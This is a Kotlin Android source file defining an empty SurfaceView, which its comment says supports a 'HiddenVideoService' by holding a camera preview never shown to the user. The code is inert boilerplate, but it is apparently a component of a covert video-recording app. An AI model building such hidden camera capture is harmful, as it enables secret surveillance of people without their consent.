package com.safe.setting.app.ui.widget

import android.annotation.SuppressLint
import android.content.Context
import android.view.SurfaceHolder
import android.view.SurfaceView

/**
 * A simple SurfaceView class required for the HiddenVideoService to function.
 * This view is never actually shown to the user but is necessary to hold the camera preview.
 */
@SuppressLint("ViewConstructor")
internal class CustomSurfaceView(context: Context) : SurfaceView(context), SurfaceHolder.Callback {

    init {
        holder.addCallback(this)
    }

    override fun surfaceCreated(holder: SurfaceHolder) {
        // Not used
    }

    override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {
        // Not used
    }

    override fun surfaceDestroyed(holder: SurfaceHolder) {
        // Not used
    }
}
